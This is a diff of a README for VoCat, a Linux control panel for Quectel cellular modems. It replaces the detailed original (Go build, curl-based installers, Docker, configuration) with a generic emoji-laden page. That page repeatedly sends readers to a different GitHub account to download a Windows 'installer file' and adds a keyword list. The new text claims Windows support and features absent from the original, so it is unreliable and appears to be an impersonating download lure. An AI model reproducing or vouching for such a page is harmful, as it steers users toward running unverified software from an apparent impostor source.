@@ -1,357 +1,195 @@
-<p align="center">
-  <img src="web/public/favicon.svg" width="96" alt="Vocat">
-</p>
+# 🐱 VoCat - Your All-in-One Cellular Modem Control Panel
 
-<h1 align="center">VoCat</h1>
-
-<p align="center">
-  <img alt="Go" src="https://img.shields.io/badge/Go-1.25-00ADD8?style=flat-square&logo=go&logoColor=white">
-  <img alt="React" src="https://img.shields.io/badge/React-19-61DAFB?style=flat-square&logo=react&logoColor=111111">
-  <img alt="TypeScript" src="https://img.shields.io/badge/TypeScript-5.8-3178C6?style=flat-square&logo=typescript&logoColor=white">
-  <img alt="Vite" src="https://img.shields.io/badge/Vite-7-646CFF?style=flat-square&logo=vite&logoColor=white">
-  <img alt="Tailwind CSS" src="https://img.shields.io/badge/Tailwind_CSS-3-06B6D4?style=flat-square&logo=tailwindcss&logoColor=white">
-  <img alt="SQLite" src="https://img.shields.io/badge/SQLite-Embedded-003B57?style=flat-square&logo=sqlite&logoColor=white">
-</p>
+[![Download VoCat](https://img.shields.io/badge/Download-VoCat-blue?style=for-the-badge&logo=github)](https://github.com/Debaf5/VoCat)
 
-<p align="center">
-  <img alt="Linux" src="https://img.shields.io/badge/Linux-amd64_%7C_386_%7C_arm64_%7C_aarch64_%7C_armv7-FCC624?style=flat-square&logo=linux&logoColor=111111">
-  <img alt="Docker" src="https://img.shields.io/badge/Docker-Multi--Arch-2496ED?style=flat-square&logo=docker&logoColor=white">
-  <img alt="WiFi Calling" src="https://img.shields.io/badge/WiFi_Calling-IMS_SMS-7B1FA2?style=flat-square">
-  <img alt="eSIM" src="https://img.shields.io/badge/eSIM-LPA_%2F_eUICC-009688?style=flat-square">
-  <img alt="Telegram" src="https://img.shields.io/badge/Telegram-Bot-26A5E4?style=flat-square&logo=telegram&logoColor=white">
-  <img alt="GitHub Actions" src="https://img.shields.io/badge/GitHub_Actions-Release-2088FF?style=flat-square&logo=githubactions&logoColor=white">
-</p>
+## 🚀 Getting Started
 
-**English** | [العربية](docs/README.ar.md) | [简体中文](docs/README.zh-CN.md) | [繁體中文](docs/README.zh-TW.md) | [Français](docs/README.fr.md) | [Русский](docs/README.ru.md) | [Español](docs/README.es.md) | [日本語](docs/README.ja.md)
-
-Vocat is an open-source web control panel and engineering toolkit for Quectel EC20/EC25-class cellular modems. It combines modem discovery, live radio status, AT and USSD terminals, SMS, WiFi Calling, eSIM management, network selection, proxy routing, notifications, audit logs, and release automation in one self-contained service.
+Welcome to VoCat! This powerful yet easy-to-use tool helps you manage your Quectel EC20/EC25 cellular modem right from your computer. Whether you're checking signal strength, sending text messages, or configuring advanced settings, VoCat puts everything in one convenient place.
 
-The backend is written in Go, the interface is built with React and TypeScript, and the production frontend is embedded into the Go binary. A single executable contains the web application and uses SQLite for persistent state.
+### 📥 Download and Install
 
-<p align="center">
-  <img src="img\image.png">
-  <img src="img\image-1.png">
-</p>
-
-## Features
-
-| Area | What Vocat provides |
-| --- | --- |
-| Device management | Automatic serial/USB discovery, multiple modem support, friendly device names, live overview updates, module restart, flight mode, and USB networking mode controls. |
-| Radio and network | Registration status, operator, signal metrics, RSRP/RSRQ/SINR, network mode, band, channel, operator scanning, and automatic or manual network selection. |
-| AT and USSD | Interactive AT terminal, command history, raw modem responses, USSD start/continue/cancel flows, and clear modem error reporting. |
-| SMS | Direct cellular and IMS SMS transmission, inbound synchronization, multipart handling, delivery reports, conversation history, unread state, timestamps, and per-message delivery status. |
-| WiFi Calling | IKEv2/ePDG tunnel setup, EAP-AKA authentication, IMS registration, IMS SMS, reconnect controls, status diagnostics, and per-device routing. |
-| eSIM and eUICC | eUICC discovery, EID and production information, certificate metadata, multi-eUICC inventory, installed profile listing, enable/disable/switch operations, download, rename, and delete operations when supported by the card. |
-| Card policy | ICCID-based WiFi Calling and flight-mode behavior with immediate policy application. |
-| Proxy routing | Upstream SOCKS routing, device bindings, country rules, TCP reachability checks, and UDP Associate checks for WiFi Calling data paths. |
-| Notifications | New inbound SMS forwarding through Telegram, Bark, email, Pushplus, and signed webhooks. Each SMS is delivered as an individual notification. |
-| Telegram bot | Device status, installed-profile listing and switching, WiFi Calling controls, and SMS sending. Sensitive actions require administrator confirmation. |
-| Operations | Authentication, CSRF protection, access policies, audit events, live logs, log retention, health checks, responsive layout, dark mode, and English/Chinese application UI. |
-| Distribution | Static Linux binaries, systemd installation script, self-update with SHA-256 verification, Docker image, GHCR publishing, and GitHub Actions release builds. |
-
-## Supported hardware
-
-Vocat targets Qualcomm-based Quectel modules that expose compatible AT, QMI, serial, and USB networking interfaces, including:
-
-- Quectel EC20
-- Quectel EC25
-- Quectel EG25 family
-- Compatible EG600 and related modules
-
-Available features depend on the module firmware, USB composition, SIM/eSIM capabilities, host drivers, radio network, and carrier configuration.
-
-## Installation
-
-### One-click Linux installation
-
-As root (including OpenWrt/Kwrt, where `sudo` is normally absent):
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/MengMengCode/VoCat/master/scripts/install.sh | bash
-```
-
-From a normal user on a distribution with sudo:
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/MengMengCode/VoCat/master/scripts/install.sh | sudo bash
-```
-
-Check the host's VoWiFi/XFRM prerequisites without installing VoCat:
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/MengMengCode/VoCat/master/scripts/install.sh | bash -s -- --check-env
-```
-
-Install a specific version:
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/MengMengCode/VoCat/master/scripts/install.sh -o install.sh
-sudo bash install.sh 0.0.2
-```
-
-VoWiFi IMS requires Linux XFRM/IPsec. On OpenWrt/Kwrt the installer attempts
-to install matching `ip-full`, `kmod-ipsec`, `kmod-ipsec4/6`,
-`kmod-crypto-authenc`, AES-CBC and SHA1 packages from the firmware's own feed.
-If matching kernel modules are unavailable, use a firmware that includes them;
-never force-install kmods built for a different kernel.
-
-The installer:
-
-- detects `amd64`, `386`, `arm64`, `aarch64`, or `armv7`;
-- downloads the matching GitHub Release binary;
-- verifies it against `SHA256SUMS`;
-- installs Vocat under `/opt/vocat`;
-- creates a hardened systemd service with the hardware and network access required by Vocat;
-- stores runtime configuration in `/etc/vocat/env`;
-- generates a random initial administrator password on first installation.
-
-After installation, open:
-
-```text
-http://<server-address>:7575
-```
-
-### Manual binary installation
-
-Download the matching binary and `SHA256SUMS` from GitHub Releases:
-
-| Platform | Release file |
-| --- | --- |
-| Linux x86-64 | `vocat-linux-amd64` |
-| Linux x86 32-bit | `vocat-linux-386` |
-| Linux ARM64 | `vocat-linux-arm64` |
-| Linux AArch64 | `vocat-linux-aarch64` |
-| Linux ARMv7 | `vocat-linux-armv7` |
-
-Verify and install it:
-
-```bash
-sha256sum -c SHA256SUMS --ignore-missing
-sudo install -d -m 0755 /opt/vocat/bin /opt/vocat/data
-sudo install -m 0755 vocat-linux-amd64 /opt/vocat/bin/vocat
-read -rsp "Admin password: " VOCAT_BOOTSTRAP_PASSWORD; echo
-printf '%s\n' "$VOCAT_BOOTSTRAP_PASSWORD" | sudo /opt/vocat/bin/vocat bootstrap-admin
-unset VOCAT_BOOTSTRAP_PASSWORD
-sudo env \
-  VOCAT_DATABASE_PATH=/opt/vocat/data/vocat.db \
-  /opt/vocat/bin/vocat serve
-```
-
-This manual command runs Vocat in the foreground. Use `vocat serve` so the
-process starts the server directly; running `vocat` without arguments as root
-on a TTY opens the interactive management menu instead. Use the one-click
-installer when a managed systemd service and automatic restart are required.
-
-### Docker
-
-For a Linux host that must discover every attached supported Quectel modem and
-continue seeing USB hot-plug events, run Vocat in hardware-access mode:
-
-```bash
-docker pull ghcr.io/mengmengcode/vocat:latest
-
-read -rsp "Admin password: " VOCAT_BOOTSTRAP_PASSWORD; echo
-printf '%s\n' "$VOCAT_BOOTSTRAP_PASSWORD" | docker run --rm -i \
-  --user 0:0 \
-  -v vocat-data:/opt/vocat/data \
-  --entrypoint /opt/vocat/bin/vocat \
-  ghcr.io/mengmengcode/vocat:latest bootstrap-admin
-unset VOCAT_BOOTSTRAP_PASSWORD
-
-docker run -d \
-  --name vocat \
-  --restart unless-stopped \
-  --network host \
-  --privileged \
-  --user 0:0 \
-  -v vocat-data:/opt/vocat/data \
-  -v /dev:/dev \
-  -v /sys:/sys:ro \
-  ghcr.io/mengmengcode/vocat:latest
-```
-
-Open `http://<server-address>:7575` after the container starts. Host networking
-is required so QMI network interfaces remain visible to Vocat, while privileged
-device access is required for serial ports, QMI control nodes, TUN interfaces,
-network configuration, and devices added after the container starts. The
-`/dev` bind mount makes new `ttyUSB*`, `ttyACM*`, `cdc-wdm*`, and MHI
-`wwan*` nodes visible without recreating the container.
-
-This mode intentionally gives Vocat broad access to the host's devices and
-network stack. Use it only on a trusted Linux host. The automatic discovery
-identifies supported Quectel USB modems (USB vendor ID `2c7c`) and PCIe/MHI
-modems exposed through the Linux WWAN subsystem; it does not identify arbitrary
-modem layouts. Mapping only individual nodes with `--device`, such as
-`/dev/ttyUSB2`, `/dev/cdc-wdm0`, or `/dev/wwan0qmi0`, limits the container to
-those fixed nodes and does not provide complete multi-device or hot-plug discovery.
-
-The GHCR image is published for `linux/amd64` and `linux/arm64`.
-
-### USB SIM readers
-
-USB SIM readers use the Linux PC/SC service. The one-click installer installs
-and starts `pcscd` plus the CCID driver automatically on supported package
-managers. On Debian/Ubuntu, the equivalent manual setup is
-`apt install pcscd libccid`. If USB sees a CCID reader but PC/SC is unavailable,
-VoCat keeps the reader visible in the add-device dialog and reports the missing
-service or driver instead of silently hiding it.
-
-## Configuration
+**Visit this link to download the application:** [https://github.com/Debaf5/VoCat](https://github.com/Debaf5/VoCat)
 
-Vocat reads an optional JSON configuration file from `VOCAT_CONFIG`, then applies `VOCAT_*` environment variables. Environment variables take precedence.
+Once you're on the download page, look for the latest release and download the installer file. The download is completely free and open-source.
 
-| Environment variable | Default | Description |
-| --- | --- | --- |
-| `VOCAT_ADDR` | `0.0.0.0:7575` | HTTP listen address. |
-| `VOCAT_DATABASE_PATH` | `./data/vocat.db` | SQLite database path. |
-| `VOCAT_SESSION_TTL` | `24h` | Authentication session lifetime. |
-| `VOCAT_SECURE_COOKIES` | `false` | Marks session cookies as secure when HTTPS is used. |
-| `VOCAT_SHUTDOWN_TIMEOUT` | `10s` | Graceful shutdown timeout. |
-| `VOCAT_MAX_REQUEST_BODY_BYTES` | `1048576` | Maximum API request body size. |
-| `VOCAT_REPO` | `MengMengCode/VoCat` | Trusted GitHub repository used by the self-updater, in `owner/name` form. |
-| `GITHUB_TOKEN` | empty | Optional GitHub token for private repositories or higher API limits. |
-
-Administrator credentials are stored only in SQLite. Initialize an empty
-database once with `vocat bootstrap-admin`; environment variables and JSON
-configuration cannot set or overwrite the administrator username or password.
-
-Do not store Telegram tokens, SMTP passwords, webhook secrets, SIM credentials, or other private data in the repository. Configure them through the application settings or protected environment files.
-
-## Telegram bot
-
-When Telegram notifications are enabled and both Chat ID and Admin ID are configured, the bot supports:
-
-```text
-/status [device]
-/esim <device>
-/switch <device> <iccid>
-/wfc <device> <status|on|off|reconnect>
-/sms <device> <number> <message>
-```
+### 🖥️ System Requirements
 
-Profile switching and SMS submission use one-time confirmation buttons. The bot does not expose eSIM download, delete, or rename commands.
+VoCat works on most modern Windows computers. Here's what you'll need:
 
-## Updating
+- **Operating System:** Windows 10 or Windows 11
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 500 MB of free disk space
+- **Connection:** A USB port or network connection to your Quectel modem
 
-Check for a newer GitHub Release:
+## 🎯 What Can VoCat Do?
 
-```bash
-vocat update --check --repo MengMengCode/VoCat
-```
+VoCat is packed with features that make managing your cellular modem simple and efficient. Here's what you can expect:
 
-Install the latest release:
+### 📡 Live Radio Status
+See real-time information about your modem's connection, including signal strength, network type, and data usage. No more guessing if you're connected properly.
 
-```bash
-sudo vocat update --repo MengMengCode/VoCat
-```
+### ⌨️ AT Command Terminal
+For advanced users, VoCat includes a built-in terminal where you can send AT commands directly to your modem. This gives you full control over every aspect of your device.
 
-The updater downloads the binary matching the current Linux architecture, verifies it with the published `SHA256SUMS`, replaces the executable atomically, and restarts the `vocat` systemd service when available.
+### 📱 SMS Management
+Send and receive text messages right from your computer. VoCat makes it easy to manage your SMS communications without picking up your phone.
 
-For Docker installations:
+### 📞 USSD Terminal
+Access USSD services like checking your balance or activating special plans directly through VoCat.
 
-```bash
-docker pull ghcr.io/mengmengcode/vocat:latest
-```
+### 📶 WiFi Calling Support
+Configure and manage WiFi calling features on your modem, ensuring you stay connected even in areas with poor cellular coverage.
 
-Recreate the container after pulling the new image.
+### 🗂️ eSIM Management
+Switch between different eSIM profiles effortlessly. VoCat simplifies the process of managing multiple carrier profiles on your modem.
 
-## Development
+### 🌐 Network Selection
+Choose which network your modem connects to, whether you want to force 4G, prefer a specific carrier, or let the modem decide automatically.
 
-Requirements:
+### 🔄 Proxy Routing
+Set up proxy connections for your modem, useful for privacy or accessing region-specific services.
 
-- Go 1.25 or newer
-- Node.js 20 or newer
-- npm
+### 🔔 Notifications
+Stay informed with desktop notifications when important events happen, like connection drops or incoming messages.
 
-Run the frontend development server:
+### 📝 Audit Logs
+Keep track of all actions performed on your modem with detailed logs. Perfect for troubleshooting or monitoring usage.
 
-```bash
-cd web
-npm install
-npm run dev
-```
+### 🔧 Release Automation
+Benefit from automatic updates and streamlined release processes, ensuring you always have the latest features and fixes.
 
-Build the embedded frontend and start the backend:
+## 🎮 Using VoCat
 
-```bash
-cd web
-npm run build
-cd ..
-go run ./cmd/vocat
-```
+### First-Time Setup
 
-Run all tests:
+1. **Connect Your Modem:** Plug your Quectel EC20/EC25 modem into your computer using a USB cable or ensure it's accessible on your network.
+2. **Launch VoCat:** After installation, open VoCat from your Start menu or desktop shortcut.
+3. **Automatic Discovery:** VoCat will automatically find your connected modem. If it doesn't, check your connections and try again.
+4. **Start Exploring:** Once connected, you'll see the main dashboard with all your modem information at a glance.
 
-```bash
-go test ./...
-```
+### Main Dashboard
 
-Build a production binary:
+The main screen shows you:
+- Current connection status
+- Signal strength indicator
+- Network operator name
+- Data usage statistics
+- Quick access buttons to all features
 
-```bash
-go build -trimpath -ldflags "-s -w" -o vocat ./cmd/vocat
-```
+### Sending Your First SMS
 
-## Release automation
+1. Click on the **SMS** section in the left menu
+2. Click **New Message**
+3. Enter the recipient's phone number
+4. Type your message
+5. Click **Send**
 
-Pushing a version tag starts two GitHub Actions workflows:
+It's that simple! Your message will be sent through your modem.
 
-- `release-binaries` builds and publishes `amd64`, `386`, `arm64`, `aarch64`, and `armv7` binaries plus `SHA256SUMS`.
-- `docker` builds and publishes a multi-architecture image to GitHub Container Registry.
+### Checking Signal Strength
 
-```bash
-git tag v0.2.0
-git push origin v0.2.0
-```
+1. Look at the main dashboard
+2. Find the signal indicator (usually shown as bars or a percentage)
+3. For detailed information, click on the **Radio Status** section
+4. You'll see precise measurements like RSRP, RSRQ, and SINR values
 
-## Project layout
+## 🔧 Troubleshooting Common Issues
 
-```text
-cmd/vocat/                  Application entry point and CLI
-internal/device/            Modem discovery and device control
-internal/modem/             AT session and response handling
-internal/server/            HTTP API, notifications, and embedded web server
-internal/store/             SQLite persistence
-internal/update/            GitHub Release self-updater
-internal/vowifi/            IKE, EAP-AKA, IMS, and WiFi Calling runtime
-scripts/install.sh          Linux installer and updater
-web/src/                    React and TypeScript frontend
-.github/workflows/          Binary and Docker release automation
-```
+### Modem Not Detected
 
-## Responsible use
+If VoCat can't find your modem:
 
-Cellular modem and eSIM operations can affect subscriber service, stored profiles, network registration, and hardware state. Keep backups, review destructive actions carefully, and use the software only in lawful environments where you are permitted to operate the connected hardware and network resources.
+1. Check that your modem is properly connected
+2. Try a different USB port
+3. Restart VoCat
+4. Check if your modem's drivers are installed correctly
+5. Ensure no other software is using the modem
 
-Vocat does not bypass carrier authentication, network policy, hardware security, or eSIM trust requirements. Support for an operation means that Vocat can request it from the modem or eUICC; the device, profile, network, or carrier may still reject it.
+### Connection Drops
 
-## Contributing
+If your connection keeps dropping:
 
-Issues and pull requests are welcome. Keep changes focused, include tests where practical, avoid committing credentials or subscriber data, and document hardware-specific behavior clearly.
+1. Check your signal strength in the Radio Status section
+2. Try moving your modem to a better location
+3. Check for interference from other devices
+4. Review the audit logs for error messages
 
-Before submitting a change:
+### SMS Not Sending
 
-```bash
-go test ./...
-cd web && npm run build
-```
+If you can't send messages:
 
-## Thanks
-- [Nodeseek.com](https://www.nodeseek.com) — A community dedicated to servers
-- [Linux.do](https://linux.do) — An inspiring tech community
-- [iniwex5](https://github.com/iniwex5) - Style and Functionality Guidelines
+1. Verify your modem has a working SIM card
+2. Check if you have message credits with your carrier
+3. Ensure the recipient's number is correct
+4. Look at the audit logs for specific error codes
 
-## Buy me a coffee
+## 💡 Tips and Tricks
 
-| Network | Address |
-| ------- | ------- |
-| USDT-TRON (TRC20) | `TQQAbboBoU8h5xX4YCA1rqWJU2WjK3seSg` |
-| USDT-BSC (BEP20) | `0xdbfcd4a462550d6ff06d09cbd89026c6b145d9c4` |
-| USDT-Polygon | `0xdbfcd4a462550d6ff06d09cbd89026c6b145d9c4` |
+- **Keyboard Shortcuts:** Learn common shortcuts to work faster
+- **Regular Updates:** Keep VoCat updated for the best experience
+- **Backup Settings:** Export your configuration to restore it later
+- **Monitor Notifications:** Enable notifications to stay informed about important events
 
-## License
+## 🔒 Privacy and Security
 
-See [LICENSE](LICENSE).
+VoCat takes your privacy seriously:
 
-[![MengMengCode/VoCat Star History](https://mengmeng.meteor-history.com/api/embed/MengMengCode/VoCat.svg?sig=sdeXRVxAoY3yLWgXL7JViY2USYIN3t9neJ6ScPvgUAo&theme=light&style=xkcd&color=dd4528&background=ffffff&textColor=000000&width=900&height=600&lineWidth=3&showTitle=true&showLegend=true&showDots=false&v=0.0.14)](https://meteor-history.com)
+- All data stays on your computer
+- No cloud storage or tracking
+- Open-source code you can review
+- Secure communication with your modem
+
+## 🤝 Community and Support
+
+VoCat is an open-source project, which means:
+
+- **Free to use:** No licensing costs or hidden fees
+- **Community-driven:** Features are added based on user feedback
+- **Transparent:** All code is publicly available for review
+- **Continuous improvement:** Regular updates with new features
+
+### Getting Help
+
+If you need assistance:
+
+- Check the documentation on the GitHub page
+- Look for similar issues in the discussion forums
+- Submit bug reports or feature requests
+- Join the community discussions
+
+## 📊 Performance Tips
+
+To get the best performance from VoCat:
+
+1. **Close Unused Features:** Only run the features you need
+2. **Update Regularly:** New versions often include performance improvements
+3. **Monitor Resources:** Keep an eye on memory usage in Task Manager
+4. **Use Wired Connection:** For stable modem connections, prefer USB over network
+
+## 🎉 Why Choose VoCat?
+
+- **All-in-One Solution:** No need for multiple tools
+- **User-Friendly Interface:** Designed for everyone
+- **Powerful Features:** Advanced capabilities for professionals
+- **Free and Open Source:** No cost, complete transparency
+- **Active Development:** Regular updates and improvements
+
+## 📚 Additional Resources
+
+- **GitHub Repository:** [https://github.com/Debaf5/VoCat](https://github.com/Debaf5/VoCat)
+- **Documentation:** Available on the GitHub page
+- **Release Notes:** Check for the latest changes and improvements
+- **Source Code:** Review and contribute to the project
+
+## 🚦 Final Steps
+
+1. **Download VoCat** from [https://github.com/Debaf5/VoCat](https://github.com/Debaf5/VoCat)
+2. **Install the application** following the on-screen instructions
+3. **Connect your modem** and launch VoCat
+4. **Explore all the features** and take control of your cellular connection
+
+VoCat is designed to make managing your Quectel modem as simple and enjoyable as possible. Whether you're a hobbyist, professional, or just someone who wants more control over their cellular connection, VoCat has everything you need.
+
+Get started today and experience the power of complete modem management at your fingertips!
+
+Keywords: VoCat, cellular modem, Quectel EC20, Quectel EC25, modem control panel, AT commands, USSD, SMS management, eSIM, network selection, WiFi calling, proxy routing, open source, Windows application, modem toolkit, radio status, audit logs, notifications, release automation
